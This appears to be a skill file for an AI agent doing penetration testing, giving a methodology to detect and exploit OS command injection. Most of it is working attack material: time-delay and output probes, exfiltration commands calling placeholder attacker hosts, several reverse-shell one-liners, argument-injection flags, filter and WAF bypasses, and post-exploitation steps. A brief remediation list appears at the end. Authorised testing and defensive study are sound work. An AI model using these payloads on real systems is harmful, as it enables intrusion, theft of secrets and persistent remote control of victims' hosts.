---
name: command-injection
description: Detect and exploit OS command injection across shell metacharacter, blind/time-based, out-of-band, and argument-injection variants on Linux and Windows targets.
---

# Command Injection

## When to use this skill

Use when user input reaches a shell (`system()`, `exec()`, `popen()`, `subprocess` with `shell=True`, `Runtime.exec` on a shell, backticks, `os/exec` without array separation, PHP `system`/`exec`/`passthru`/`` ` `` backticks). High-value endpoints: ping/ traceroute/dig/whois utilities, file processors (ImageMagick, LibreOffice, ffmpeg, `pdf` converters), import/export features, cron/backup/health-check panels, log viewers, ping-back/URL checkers, MDM/device-management consoles, git-web interfaces, CI/CD variables, server monitoring widgets.

## Methodology

### 1. Probe with harmless, unambiguous commands

The goal is a *differential* (response length/timing/content changes), not necessarily output in the response:

```
Time delay (portable, both platforms):
; sleep 10     | sleep 10     && sleep 10    || sleep 10
$(sleep 10)    `sleep 10`     %0a sleep 10   #  newline

Windows:    & timeout 10     & ping -n 11 127.0.0.1     | timeout 10
Unix analogues that work when output is echoed back:
; id        | id        && id        $(id)        `id`
```

If the input is embedded inside a double-quoted shell argument, break out:

```
"; sleep 10;"      `"; id #"` — with double quotes the `#` comments out trailing app text
' ; sleep 10; '    — inside single quotes try:  ' ; sleep 10; echo -n '
```

### 2. Operator/separator cheatsheet

| Context | Unix | Windows |
|---|---|-filterable:none|---|
| Sequential | `; cmd` | `& cmd` |
| Pipe | `\| cmd` | `\| cmd` |
| AND | `&& cmd` | `&& cmd` |
| OR | `\|\| cmd` | `\|\| cmd` |
| Substitution | `` `cmd` `` / `$(cmd)` | `cmd /c` |
| Newline | `%0a` | `%0a` (works if app uses `cmd /c` or `bash -c`) |
| Background | `& cmd &` | `start /b cmd` |

### 3. Get output back into the response

Direct echo:

```
; id             (app prints command output in response — best case)
; echo START:; id; echo :END
```

When output doesn't echo, exfiltrate via a writable web path:

```
; curl http://ATTACKER/$(id|base64 -w0)
; wget -q -O /var/www/html/pwn.txt "http://ATTACKER/?d=$(id|base64)"   then GET /pwn.txt
; cp /etc/passwd /var/www/html/  (write into webroot if webserver runs as same user)
```

OOB / network-covert channels (no output, no writable path):

```
; nslookup $(id | md5sum | cut -c1-8).attacker.tld          (DNS — most reliable)
; ping -c1 $(whoami).attacker.tld
; curl http://attacker.tld/$(hostname)
# Windows:
& nslookup %COMPUTERNAME%.attacker.tld
& powershell -c "Invoke-WebRequest http://attacker.tld/$env:USERNAME"
```

### 4. Blind → interactive reverse shell

Escalate from blind injection to a shell (choose per detected stack):

```
bash -i >& /dev/tcp/ATT/4444 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATT 4444 >/tmp/f
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATT",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
# Windows:
& powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATT',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$c.GetStream().Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String); $r2=$r+'PS '+(pwd).Path+'> '; $sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

**Tooling shortcut:** use my `reverse-shell-cheatsheet` skill for the full shell matrix + one-liner generators.

### 5. Argument injection (no shell metacharacters, still RCE)

If input lands as a *separate argument* to a fixed binary (no `; | &`), abuse the binary's own flags:

| Binary | Dangerous flag | Effect |
|---|---|--|
| `ssh` | `-oProxyCommand=...` | RCE (spawn shell via ProxyCommand) |
| `curl` | `-o /path` | arbitrary file overwrite; `-K` custom config file |
| `wget` | `--post-file=/etc/passwd` | exfil file to attacker |
| `tar` | `--checkpoint-action=exec=sh evil.sh` | RCE on extraction (tar >=1.30) |
| `rsync` | `-e 'sh -c ...'` | RCE |
| `zip`/`unzip` | none direct; combine with symlinks | file overwrite |
| `ffmpeg` | `-i http://ATT/x.m3u` | SSRF/file-read (concat demuxer) |
| `git` | `--upload-pack=...` | RCE when `git` is the fixed command |
| `find` | `-exec id ;` | RCE |
| `sqlite3` | `.output /path` | file write |
| `chroot`/`sudo` misconfigs | `--` confusion | escape intended restriction |

Payload pattern: if the app runs `ping <input>`, send `127.0.0.1 -o ProxyCommand=...`-style extras by injecting spaces: `127.0.0.1 -oProxyCommand="sh -c id"` — spaces usually blocked? Use `$IFS`: `-oProxyCommand=$IFS...`.

### 6. Bypass filters and WAFs

```
Spaces:      $IFS  ${IFS}  $IFS$9  <  <>  {cat,/etc/passwd}  %09(tab)  %0a
Keywords:    c'a't  c"a"t  c\at  /???/??t /etc/p???wd  $(printf %s ca)$(printf %s t)
Concat:      a=cat;b=/etc/passwd;$a $b       c{at,/etc/passwd}
Case:        CaT (on Windows cmd is case-insensitive anyway)
Quotes inside: use $'...' ANSI-C quoting or hex: $(printf '\x69\x64')
Windows:     %PROGRAMFILES:~0,1% → substring trick;  ^&  redirection escapes
Null bytes:  %00 (older PHP) to truncate appended suffixes like ".pdf"
```

Encode round-trips: `%0a`, `%20`, `+`, double-URL-encode `%25%30%61`, unicode when the backend decodes twice.

### 7. Framework/language specifics

- **PHP**: `system`, `exec`, `passthru`, `shell_exec`, `popen`, backticks, `proc_open`, `pcntl_exec`, `expect://`, `eval` of user data; disable_functions bypass via `pcntl_exec`/`FFI`/`mail()`+`putenv` (PHP<8.3 with LD_PRELOAD trick via `mail` and `chankro`).
- **Python**: `subprocess` with `shell=True`, `os.system`, `os.popen`, `eval`, `pickle` (→ see my `deserialization` skill), `yaml.load` without Loader (→ `python-yaml-deserialization`).
- **Java**: `Runtime.getRuntime().exec()` — no shell by default; injection only if the app uses `sh -c` or builds a single string. Argument injection more likely than classic injection. `ProcessBuilder` with list args = no injection but *argument* injection still possible.
- **Node**: `child_process.exec` (shell), `execSync`, `eval`; safe: `spawn` with array args.
- **Windows**: `cmd /c` semantics: `&` chaining, `^` escaping, `||` `&&`, plus PowerShell injection via `-enc` base64 command payloads.

## Verification & Deliverables

- **Confirmed RCE**: command output in response (e.g. `uid=33 www-data`) or OOB callback captured (interaction ID in DNS/HTTP log), plus evidence of command echo in a screenshot.
- **Impact**: arbitrary code execution as web-user → full compromise of that host: read source/`env` (secrets), pivot to internal network, poison cron, dump DB creds, achieve persistence.
- **Post-exploitation**: capture `id`, `hostname`, `ls -la /var/www`, `env` (blew secrets), `sudo -l` (privesc path), reverse shell for stable access, document the escalation chain.
- **Remediation**: avoid shelling out entirely; use library equivalents (e.g. Pillow instead of ImageMagick, `netlib` instead of `ping`); if unavoidable, allowlist strict regex `^[a-zA-Z0-9._-]+$` and pass args as array (`subprocess.run([...], shell=False)`); run under separate low-priv user + `noexec`/`nosuid` mount + seccomp; monitor with auditd execve rules; WAF alone is not a fix (bypasses above).
- **Artifacts**: vulnerable endpoint + parameter, injection operator matrix results, RCE proof screenshot + `id` output, OOB interaction log, reverse-shell session log (sanitized), remediation snippet.
